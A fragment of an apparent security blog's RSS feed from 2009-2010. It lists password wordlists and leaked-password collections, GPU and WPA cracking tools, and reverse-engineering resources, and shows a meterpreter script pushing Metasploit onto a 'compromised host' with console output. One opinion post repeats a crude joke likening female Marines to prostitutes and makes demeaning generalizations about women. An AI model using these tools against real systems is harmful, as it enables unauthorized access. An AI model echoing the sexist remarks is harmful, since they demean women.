+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.vulnerabilityassessment.co.uk/passwords.htm&#34;&gt;http://www.vulnerabilityassessment.co.uk/passwords.htm&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://packetstormsecurity.org/Crackers/wordlists/&#34;&gt;http://packetstormsecurity.org/Crackers/wordlists/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.ai.uga.edu/ftplib/natural-language/moby/&#34;&gt;http://www.ai.uga.edu/ftplib/natural-language/moby/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.insidepro.com/eng/download.shtml&#34;&gt;http://www.insidepro.com/eng/download.shtml&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.word-list.com/&#34;&gt;http://www.word-list.com/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.cotse.com/tools/wordlists1.htm&#34;&gt;http://www.cotse.com/tools/wordlists1.htm&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.cotse.com/tools/wordlists2.htm&#34;&gt;http://www.cotse.com/tools/wordlists2.htm&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.phreak.org/index/archive01/hacking/wordlsts/wordlsts.shtml&#34;&gt;http://www.phreak.org/index/archive01/hacking/wordlsts/wordlsts.shtml&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.indianz.ch/tools/doc/wordlists.zip&#34;&gt;http://www.indianz.ch/tools/doc/wordlists.zip&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://wordlist.sourceforge.net/&#34;&gt;http://wordlist.sourceforge.net/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://prdownloads.sourceforge.net/wepattack/wordlist.tar.gz?download&#34;&gt;http://prdownloads.sourceforge.net/wepattack/wordlist.tar.gz?download&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://hacor.org/docs/hugelist.txt&#34;&gt;http://hacor.org/docs/hugelist.txt&lt;/a&gt; (broken link. Does anyone have it hosted elsewhere?)&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;shhh! - &lt;a href=&#34;http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff729e4b0b79cd4cd3376/1269925152237/hugelist.txt&#34;&gt;http://www.room362.com/storage/saved/hugelist.txt&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;By operat0r&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://rapidshare.com/files/165513464/word.lst.s.u.john.s.u.200.part01.rar&#34;&gt;http://rapidshare.com/files/165513464/word.lst.s.u.john.s.u.200.part01.rar&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://rapidshare.com/files/165518143/word.lst.s.u.john.s.u.200.part02.rar&#34;&gt;http://rapidshare.com/files/165518143/word.lst.s.u.john.s.u.200.part02.rar&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://rapidshare.com/files/165498510/word.lst.s.u.john.s.u.200.part03.rar&#34;&gt;http://rapidshare.com/files/165498510/word.lst.s.u.john.s.u.200.part03.rar&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://wiki.services.openoffice.org/wiki/Dictionaries&#34;&gt;http://wiki.services.openoffice.org/wiki/Dictionaries&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://article7.org/wordlists/&#34;&gt;http://article7.org/wordlists/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2010-03-30 04:22 by Rob Fuller&lt;/p&gt;
+
+&lt;p&gt;Recent additions:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.skullsecurity.org/wiki/index.php/Passwords&#34;&gt;http://www.skullsecurity.org/wiki/index.php/Passwords&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;hotmail: &lt;a href=&#34;http://current.com/technology/91108676_email-password-leak-update-gmail-yahoo-aol-and-hotmail-hit-too.htm&#34;&gt;http://current.com/technology/91108676_email-password-leak-update-gmail-yahoo-aol-and-hotmail-hit-too.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;rockyou: &lt;a href=&#34;http://securitystream.info/data-breaches/easy-passwords-found-in-rockyou-data-leak/&#34;&gt;http://securitystream.info/data-breaches/easy-passwords-found-in-rockyou-data-leak/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://wordlist.sourceforge.net/&#34;&gt;http://wordlist.sourceforge.net/&lt;/a&gt; (Kevin&amp;rsquo;s Word Lists)&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.phenoelit-us.org/dpl/dpl.html&#34;&gt;http://www.phenoelit-us.org/dpl/dpl.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.offensive-security.com/wpa-tables/wpalist.txt.tar.bz2&#34;&gt;http://www.offensive-security.com/wpa-tables/wpalist.txt.tar.bz2&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.renderlab.net/projects/WPA-tables/&#34;&gt;http://www.renderlab.net/projects/WPA-tables/&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>GPU Hash / Password Cracking</title>
+      <link>http://localhost:1313/post/2009/2009917gpu-hash-password-cracking-html/</link>
+      <pubDate>Fri, 18 Sep 2009 01:44:39 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009917gpu-hash-password-cracking-html/</guid>
+      <description>&lt;p&gt;I recently upgraded my video card and had a rough time finding programs that fit the hype of GPU password cracking, so here is what I found so that you won&amp;rsquo;t have as hard a time.&lt;/p&gt;
+
+&lt;p&gt;Ivan Golubev&amp;rsquo;s SHA1/MD5/MD4 cracker: &lt;a href=&#34;http://www.golubev.com/hashgpu.htm&#34;&gt;&lt;br /&gt;
+http://www.golubev.com/hashgpu.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Ivan Golubev&amp;rsquo;s RAR pass cracker:&lt;br /&gt;
+&lt;a href=&#34;http://www.golubev.com/rargpu.htm&#34;&gt;http://www.golubev.com/rargpu.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;CUDA Multiforcer (down at the time of this posting)&lt;br /&gt;
+&lt;a href=&#34;http://www.cryptohaze.com/bruteforcers.php&#34;&gt;http://www.cryptohaze.com/bruteforcers.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;BarsWF - MD5 Cracker:&lt;br /&gt;
+&lt;a href=&#34;http://3.14.by/en/md5&#34;&gt;http://3.14.by/en/md5&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;GPU MD5 Crack: (Included in BackTrack 4 repos &amp;ldquo;gpu-md5-crack&amp;rdquo;)&lt;br /&gt;
+&lt;a href=&#34;http://bvernoux.free.fr/md5/index.php&#34;&gt;http://bvernoux.free.fr/md5/index.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Distributed Hash Cracker:&lt;br /&gt;
+&lt;a href=&#34;http://rpisec.net/projects/show/hash-cracker&#34;&gt;http://rpisec.net/projects/show/hash-cracker&lt;/a&gt;&lt;br /&gt;
+&amp;rdquo; This is an interesting one as it has a PHP front end and is agent based, so you can use one or a dozen computers, and it will use the CPUs and GPUs available&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;Pentoo Live CD with a bunch of GPU cracking goodness built in:&lt;br /&gt;
+&lt;a href=&#34;http://pentoo.blogspot.com/&#34;&gt;http://pentoo.blogspot.com/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Extreme GPU Bruteforcer (39.95 Euro)&lt;br /&gt;
+&lt;a href=&#34;http://www.insidepro.com/eng/egb.shtml&#34;&gt;http://www.insidepro.com/eng/egb.shtml&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;ElcomSoft Distributed Password Recovery ($599 for 1st lvl - 20 hosts)&lt;br /&gt;
+&lt;a href=&#34;http://www.elcomsoft.com/edpr.html&#34;&gt;http://www.elcomsoft.com/edpr.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;ax0n from &lt;a href=&#34;http://www.h-i-r.net/&#34;&gt;http://www.h-i-r.net/&lt;/a&gt; shot me an email stating that BT4 has some more GPU tools added to it:&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Just FYI, BT4 also added some CUDA GPU cracking functionality a while&lt;br /&gt;
+back ago. IIRC It includes Pyrit and CUDA-Multiforcer &amp;ndash; maybe a few&lt;br /&gt;
+others. Pyrit is a cuda-enabled WPA-PSK cracker that you may also be&lt;br /&gt;
+interested in.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Pyrit - WPA/PSK - WPA2/PSK GPU cracker&lt;br /&gt;
+&lt;a href=&#34;http://code.google.com/p/pyrit/&#34;&gt;http://code.google.com/p/pyrit/&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Sexism and the religion of hackers</title>
+      <link>http://localhost:1313/post/2009/2009713sexism-and-the-religion-of-hackers-html/</link>
+      <pubDate>Mon, 13 Jul 2009 19:36:05 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009713sexism-and-the-religion-of-hackers-html/</guid>
+      <description>
+
+&lt;p&gt;Let me preempt this post with the following facts: I am a white male veteran with amazing parents. I went to a good school, and was never under-valued by the people I cared about. I fit no minority profiles in other words. I tell you this so that you can latch on to it as why I don&amp;rsquo;t understand anything in your rebuttal. But I think this gives me a unique view on the issue.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;People are stupid. They will believe a lie because they want to believe it&amp;rsquo;s true, or because they are afraid it might be true.&amp;rdquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&amp;mdash;-Wizard&amp;rsquo;s First Rule - By Terry Goodkind&lt;/p&gt;
+
+&lt;p&gt;This post was a long time coming. I feel pretty passionate about &amp;ldquo;my community&amp;rdquo;. I don&amp;rsquo;t say that in a lead-follower sense, but more of a Kum Ba Ya one. The feather that pushed this post over the edge into existence is @&lt;a href=&#34;http://twitter.com/shazzzam&#34;&gt;shazzzam&lt;/a&gt;&amp;rsquo;s post &amp;ldquo;&lt;a href=&#34;http://demosthenes.tumblr.com/post/140922392/female-stereotyping-in-security-research&#34;&gt;Female stereotyping in security research&lt;/a&gt;&amp;rdquo; which was in response to the &lt;a href=&#34;http://hackerschool.org/DefconCTF/17/B300.html&#34;&gt;Saphead&amp;rsquo;s Binary 300 solution cartoon&lt;/a&gt;. But please keep in mind, this only set the cogs in motion for this post that I&amp;rsquo;ve been thinking about way before this cartoon came into existence.&lt;/p&gt;
+
+&lt;p&gt;Sexism, and for that matter, any &amp;ldquo;-ism&amp;rdquo; is flawed on both sides. Now, Shazzzam went no where near the extreme that most of the &amp;ldquo;-ists&amp;rdquo; do for their &amp;ldquo;-isms&amp;rdquo;, she actually had some great points however, that doesn&amp;rsquo;t excuse the presumptions she made. Pusscat, Hypatia, and Shazzzam (+ the many other women in IT) have made enormous contributions, just as males have. Hackers are hackers. The only thing we measure by is the brain in your noggin, but I&amp;rsquo;ll go into that later. Where Shazzzam went wrong is that she assumed that this cartoon was depicting the female falsely, which may or may have not been the case. She then used it as a soap box to express her hate for people who make presumptions about her mental abilities because of her sex.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;(Damn men, &amp;ldquo;they&amp;rdquo; are always assuming I&amp;rsquo;m an idiot)&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;What&amp;rsquo;s the difference between a WM (woman-Marine) and a hooker? Hooker gets paid in the morning and the WM gets paid on the 1st and 15th.&amp;rdquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&amp;mdash;-old Marine joke, origin unknown&lt;/p&gt;
+
+&lt;p&gt;While this is a crude joke, it illustrates a point. During my time in the Marine Corps I witnessed female Marines that were useless, ones that slept around, and those that outshined their peers, male and female alike. But guess what, those that did well were sadly the minority in my experiences. Now you might hinge your argument on that it&amp;rsquo;s my biased opinion that &amp;lsquo;saw&amp;rsquo; what I wanted to see, and you very well could be right. I hardly consider myself perfect, but lets just say for the sake of argument that what I say is true. We all make assumptions, you are not perfect either, is it so wrong to bet on odds or experience when making assumptions? It&amp;rsquo;s human nature, but keeping an open mind is the key to this. How many Mark Dowds, HDs, Shazzzams and Pusscats are there in this world? How many times have you complained about an idiot boss or co-worker? How many times have you complained about script kiddies? or whatever you complain about on an assumption or amassed experience.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;(Stupid woman, &amp;ldquo;they&amp;rdquo; never do anything right, can&amp;rsquo;t even drive straight)&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;This brings us to my favorite part, and why I love our community. Hackers are hackers:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;snip&gt; (&lt;a href=&#34;http://www.phrack.org/issues.html?issue=7&amp;amp;id=3&amp;amp;mode=txt&#34;&gt;original - phrak&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;We exist without skin color, without nationality, without religious &lt;strong&gt;&lt;em&gt;(or sexual)&lt;/em&gt;&lt;/strong&gt; bias&amp;hellip; and you call us criminals. You build atomic bombs, you wage wars, you murder, cheat, and lie to us and try to make us believe it&amp;rsquo;s for our own good, yet we&amp;rsquo;re the criminals.&lt;/p&gt;
+
+&lt;p&gt;Yes, I am a criminal. My crime is that of curiosity. My crime is that of judging people by what they say and think, not what they look like. My crime is that of outsmarting you, something that you will never forgive me for.&lt;/p&gt;
+
+&lt;p&gt;I am a hacker, and this is my manifesto. You may stop this individual, but you can&amp;rsquo;t stop us all&amp;hellip; after all, we&amp;rsquo;re all alike.&lt;/p&gt;
+
+&lt;p&gt;+++The Mentor+++&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I&amp;rsquo;ve taken the liberty of adding &amp;ldquo;(or sexual)&amp;rdquo; to this famous manifesto. But I think it stays in the spirit of it&amp;rsquo;s writer&amp;rsquo;s intent. This is my religion. I think all &amp;ldquo;ists&amp;rdquo; have forgotten what they fight for and just fight to be right. My suggestion? Make a mental note of those who have forgotten how to truly be what they claim as a title. For they will out themselves time and time again, and be destined to fail.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;(Damn kids. They&amp;rsquo;re all alike.)&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;edit-nikita-has-done-an-excellent-job-of-expressing-what-i-so-obviously-failed-at-doing-http-attrition-org-news-content-09-07-14-001-html-http-attrition-org-news-content-09-07-14-001-html:8cc7e12017d3404c7193dfdbd380073e&#34;&gt;EDIT: Nikita has done an excellent job of expressing what I so obviously failed at doing: &lt;a href=&#34;http://attrition.org/news/content/09-07-14.001.html&#34;&gt;http://attrition.org/news/content/09-07-14.001.html&lt;/a&gt;&lt;/h4&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit Framework as a Payload</title>
+      <link>http://localhost:1313/post/2009/2009626metasploit-framework-as-a-payload-html/</link>
+      <pubDate>Fri, 26 Jun 2009 05:45:08 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009626metasploit-framework-as-a-payload-html/</guid>
+      <description>
+
+&lt;p&gt;Well, sorta…&lt;/p&gt;
+
+&lt;p&gt;I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;You can download the script here: &lt;a href=&#34;http://localhost:1313/scripts-and-programs/metasploit/deploymsf.rb&#34;&gt;/scripts-and-programs/metasploit/deploymsf.rb&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You can download the cygwin installs from the metasploit website:&lt;/p&gt;
+
+&lt;p&gt;13mb FULL framework: &lt;a href=&#34;https://metasploit.com/framework-3.3-dev.exe&#34;&gt;https://metasploit.com/framework-3.3-dev.exe&lt;/a&gt;&lt;br /&gt;
+5mb MINI (just msfconsole): &lt;a href=&#34;https://metasploit.com/mini-3.3-dev.exe&#34;&gt;https://metasploit.com/mini-3.3-dev.exe&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And here is what it looks like:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; run deploymsf -f framework-3.3-dev.exe&lt;br /&gt;
+[&lt;em&gt;] Running Meterpreter MSFp Deploytment Script&amp;hellip;..&lt;br /&gt;
+[&lt;/em&gt;] Uploading MSFp for for deployment&amp;hellip;.&lt;br /&gt;
+[&lt;em&gt;] MSFp uploaded as C:DOCUME~1mubixLOCALS~1Temp12681.exe&lt;br /&gt;
+[&lt;/em&gt;] Installing MSFp&amp;hellip;&amp;hellip;&amp;hellip;..&lt;br /&gt;
+[&lt;em&gt;] Done!&lt;br /&gt;
+[&lt;/em&gt;] Installation Complete!&lt;br /&gt;
+[&lt;em&gt;] Running cygwin shell channelized&amp;hellip;&lt;br /&gt;
+[&lt;/em&gt;] Channel 18 created - Type: interact 18 to play&lt;br /&gt;
+[&lt;em&gt;] Be warned, it takes a bit for post setup to happen&lt;br /&gt;
+[&lt;/em&gt;] and you will not see a prompt, try pwd to check&lt;br /&gt;
+meterpreter &amp;gt; interact 18&lt;br /&gt;
+Interacting with channel 18&amp;hellip;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;[&lt;em&gt;] Configuring multi-user permissions for first run&amp;hellip;&lt;br /&gt;
+[&lt;/em&gt;] Configuring the initial user environment&amp;hellip;&lt;br /&gt;
+pwd&lt;br /&gt;
+/home/mubix&lt;br /&gt;
+ls&lt;br /&gt;
+msfconsole&lt;br /&gt;
+*** Metasploit only has EXPERIMENTAL support for Ruby 1.9.1 and newer, things may break!&lt;br /&gt;
+*** Please report bugs to msfdev[at]metasploit.com&lt;br /&gt;
+[-] ***&lt;br /&gt;
+[-] * WARNING: No database support: LoadError no such file to load &amp;ndash; active_record&lt;br /&gt;
+[-] ***&lt;/p&gt;
+
+&lt;h2 id=&#34;toc_0:ea2ba5f26cf1305eefa185d4e5eff0d2&#34;&gt;### ## ##&lt;/h2&gt;
+
+&lt;h2 id=&#34;toc_1:ea2ba5f26cf1305eefa185d4e5eff0d2&#34;&gt;## #### ###### #### ##### ##### ## #### ######&lt;/h2&gt;
+
+&lt;p&gt;####### ## ## ## ## ## ## ## ## ## ## ### ##&lt;br /&gt;
+####### ###### ## ##### #### ## ## ## ## ## ## ##&lt;/p&gt;
+
+&lt;h2 id=&#34;toc_2:ea2ba5f26cf1305eefa185d4e5eff0d2&#34;&gt;# ## ## ## ## ## ## ##### ## ## ## ## ##&lt;/h2&gt;
+
+&lt;h2 id=&#34;toc_3:ea2ba5f26cf1305eefa185d4e5eff0d2&#34;&gt;## #### ### ##### ##### ## #### #### #### ###&lt;/h2&gt;
+
+&lt;p&gt;=[ msf v3.3-dev&lt;br /&gt;
++ &amp;ndash; &amp;ndash;=[ 379 exploits - 231 payloads&lt;br /&gt;
++ &amp;ndash; &amp;ndash;=[ 20 encoders - 7 nops&lt;br /&gt;
+=[ 156 aux&lt;/p&gt;
+
+&lt;p&gt;msf &amp;gt;GAME OVER&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Getting your fill of Reverse Engineering and Malware Analysis</title>
+      <link>http://localhost:1313/post/2009/2009612getting-your-fill-of-reverse-engineering-and-malware-analysi-html/</link>
+      <pubDate>Fri, 12 Jun 2009 18:46:02 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009612getting-your-fill-of-reverse-engineering-and-malware-analysi-html/</guid>
+      <description>
+
+&lt;p&gt;&lt;a href=&#34;http://www.exoticliability.com/profile/Matt&#34;&gt;Matt&lt;/a&gt;, from the &lt;a href=&#34;http://www.exoticliability.com/&#34;&gt;Exotic Liability&lt;/a&gt; &lt;a href=&#34;http://www.exoticliability.com/forum/&#34;&gt;forums&lt;/a&gt;, posed a suggestion for a episode: &amp;ldquo;&lt;a href=&#34;http://www.exoticliability.com/forum/topics/getting-started-reverse&#34;&gt;Getting started [in] reverse engineering hardware drivers?&lt;/a&gt;&amp;rdquo;. I thought this was an interesting topic to attack so, I dug a bit into my RSS feed pile of goo and compiled this list of links. Hope this helps Matt.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&#34;individuals:928412f226e1ec8c65ef7891df73816f&#34;&gt;&lt;strong&gt;Individuals &amp;mdash;&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;** **Skywing - &lt;a href=&#34;http://www.nynaeve.net/&#34;&gt;http://www.nynaeve.net/&lt;/a&gt;&lt;br /&gt;
+Egypt - &lt;a href=&#34;http://0xegypt.blogspot.com/&#34;&gt;http://0xegypt.blogspot.com/&lt;/a&gt;&lt;br /&gt;
+Yoni - &lt;a href=&#34;http://zeroflag.wordpress.com/&#34;&gt;http://blogs.msdn.com/michael_howard/&lt;/a&gt;&lt;br /&gt;
+Raymond Chen - &lt;a href=&#34;http://blogs.msdn.com/oldnewthing/&#34;&gt;http://blogs.msdn.com/oldnewthing/&lt;/a&gt;&lt;br /&gt;
+Sia0 - &lt;a href=&#34;http://blogs.msdn.com/michkap/&#34;&gt;http://blogs.msdn.com/michkap/&lt;/a&gt;&lt;br /&gt;
+Rob P - &lt;a href=&#34;http://geekswithblogs.net/robp/Default.aspx&#34;&gt;http://geekswithblogs.net/robp/Default.aspx&lt;/a&gt;&lt;br /&gt;
+Quantam - &lt;a href=&#34;http://qstuff.blogspot.com/&#34;&gt;http://qstuff.blogspot.com/&lt;/a&gt;&lt;br /&gt;
+Phn1x - &lt;a href=&#34;http://hamsterswheel.com/techblog/&#34;&gt;http://hamsterswheel.com/techblog/&lt;/a&gt;&lt;br /&gt;
+Halavar Flake - &lt;a href=&#34;http://addxorrol.blogspot.com/&#34;&gt;http://addxorrol.blogspot.com/&lt;/a&gt;&lt;br /&gt;
+Pedram - &lt;a href=&#34;http://pedram.redhive.com/blog&#34;&gt;http://pedram.redhive.com/blog&lt;/a&gt;&lt;br /&gt;
+Tyler Shields - &lt;a href=&#34;http://www.donkeyonawaffle.org/&#34;&gt;http://www.donkeyonawaffle.org/&lt;/a&gt;&lt;br /&gt;
+Wesley Shields - &lt;a href=&#34;http://www.atarininja.org/&#34;&gt;http://www.atarininja.org/&lt;/a&gt;&lt;br /&gt;
+Peter Wieland - &lt;a href=&#34;http://blogs.msdn.com/peterwie/&#34;&gt;http://blogs.msdn.com/peterwie/&lt;/a&gt;&lt;br /&gt;
+Michael Howard - &lt;a href=&#34;http://blogs.msdn.com/michael_howard/&#34;&gt;http://blogs.msdn.com/michael_howard/&lt;/a&gt;&lt;br /&gt;
+Doron Holan - &lt;a href=&#34;http://blogs.msdn.com/doronh/&#34;&gt;http://blogs.msdn.com/doronh/&lt;/a&gt;&lt;br /&gt;
+Nico Waisman - &lt;a href=&#34;http://eticanicomana.blogspot.com/&#34;&gt;http://eticanicomana.blogspot.com/&lt;/a&gt;&lt;br /&gt;
+Dmitry Vostokov - &lt;a href=&#34;http://www.dumpanalysis.org/blog/&#34;&gt;http://www.dumpanalysis.org/blog/&lt;/a&gt;&lt;br /&gt;
+Nicolas Sylvain - &lt;a href=&#34;http://nsylvain.blogspot.com/&#34;&gt;http://nsylvain.blogspot.com/&lt;/a&gt;&lt;br /&gt;
+Alex Ionescu - &lt;a href=&#34;http://www.alex-ionescu.com/&#34;&gt;http://www.alex-ionescu.com/&lt;/a&gt;&lt;br /&gt;
+Mattheiu Suiche - &lt;a href=&#34;http://www.msuiche.net/&#34;&gt;http://www.msuiche.net/&lt;/a&gt;&lt;br /&gt;
+Larry Osterman - &lt;a href=&#34;http://blogs.msdn.com/larryosterman/&#34;&gt;http://blogs.msdn.com/larryosterman/&lt;/a&gt;&lt;br /&gt;
+Koby Kahane - &lt;a href=&#34;http://kobyk.wordpress.com/&#34;&gt;http://kobyk.wordpress.com/&lt;/a&gt;&lt;br /&gt;
+Jason Geffner - &lt;a href=&#34;http://malwareanalysis.com/communityserver/blogs/geffner/default.aspx&#34;&gt;http://malwareanalysis.com/communityserver/blogs/geffner/default.aspx&lt;/a&gt;&lt;br /&gt;
+Ero Carrera - &lt;a href=&#34;http://blog.dkbza.org/&#34;&gt;http://blog.dkbza.org/&lt;/a&gt;&lt;br /&gt;
+Dino Dai Zovi - &lt;a href=&#34;http://blog.trailofbits.com/&#34;&gt;http://blog.trailofbits.com/&lt;/a&gt;&lt;br /&gt;
+Ilja - &lt;a href=&#34;http://blogs.23.nu/ilja/&#34;&gt;http://blogs.23.nu/ilja/&lt;/a&gt;&lt;br /&gt;
+Nate Lawson - &lt;a href=&#34;http://rdist.root.org/&#34;&gt;http://rdist.root.org/&lt;/a&gt;&lt;br /&gt;
+Mark Russinovich - &lt;a href=&#34;http://blogs.technet.com/markrussinovich/&#34;&gt;http://blogs.technet.com/markrussinovich/&lt;/a&gt;&lt;br /&gt;
+Jose Nazario - &lt;a href=&#34;http://www.wormblog.com/&#34;&gt;http://www.wormblog.com/&lt;/a&gt;&lt;br /&gt;
+Jonathan Morrison - &lt;a href=&#34;http://blogs.msdn.com/itgoestoeleven/&#34;&gt;http://blogs.msdn.com/itgoestoeleven/&lt;/a&gt;&lt;br /&gt;
+John Robbins - &lt;a href=&#34;http://www.wintellect.com/cs/blogs/jrobbins/default.aspx&#34;&gt;http://www.wintellect.com/cs/blogs/jrobbins/default.aspx&lt;/a&gt;&lt;br /&gt;
+Ilias Tsigkogiannis - &lt;a href=&#34;http://blogs.msdn.com/iliast/&#34;&gt;http://blogs.msdn.com/iliast/&lt;/a&gt;&lt;br /&gt;
+Daniel Reynaud - &lt;a href=&#34;http://indefinitestudies.org/&#34;&gt;http://indefinitestudies.org/&lt;/a&gt;&lt;br /&gt;
+Joanna Rutkowska - &lt;a href=&#34;http://theinvisiblethings.blogspot.com/&#34;&gt;http://theinvisiblethings.blogspot.com/&lt;/a&gt;&lt;br /&gt;
+Matthieu Kaczmarek - &lt;a href=&#34;http://www.loria.fr/~kaczmare/index.en.htm&#34;&gt;http://www.loria.fr/~kaczmare/index.en.htm&lt;/a&gt;&lt;br /&gt;
+Silvio Cesare - &lt;a href=&#34;http://silviocesare.wordpress.com/&#34;&gt;http://silviocesare.wordpress.com/&lt;/a&gt;&lt;br /&gt;
+Philippe Beaucamps - &lt;a href=&#34;http://www.loria.fr/~beaucphi/&#34;&gt;http://www.loria.fr/~beaucphi/&lt;/a&gt;&lt;br /&gt;
+Debugging Toolbox - &lt;a href=&#34;http://blogs.msdn.com/debuggingtoolbox/&#34;&gt;http://blogs.msdn.com/debuggingtoolbox/&lt;/a&gt;[](&lt;a href=&#34;http://www.loria.fr/~beaucphi/&#34;&gt;http://www.loria.fr/~beaucphi/&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;Fravia&amp;rsquo;s saved works (RIP) - &lt;a href=&#34;http://www.woodmann.com/fravia/index.htm&#34;&gt;http://www.woodmann.com/fravia/index.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;groups:928412f226e1ec8c65ef7891df73816f&#34;&gt;Groups &amp;mdash;&lt;/h3&gt;
+
+&lt;p&gt;Offensive Computing - &lt;a href=&#34;http://www.offensivecomputing.net/&#34;&gt;http://www.offensivecomputing.net/&lt;/a&gt;&lt;br /&gt;
+The Cover of Night - &lt;a href=&#34;http://www.thecoverofnight.com/blog/&#34;&gt;http://www.thecoverofnight.com/blog/&lt;/a&gt;&lt;br /&gt;
+LHS - &lt;a href=&#34;http://lhs.loria.fr/&#34;&gt;http://lhs.loria.fr/&lt;/a&gt;&lt;br /&gt;
+NT Debugging - &lt;a href=&#34;http://blogs.msdn.com/ntdebugging/&#34;&gt;http://blogs.msdn.com/ntdebugging/&lt;/a&gt;&lt;br /&gt;
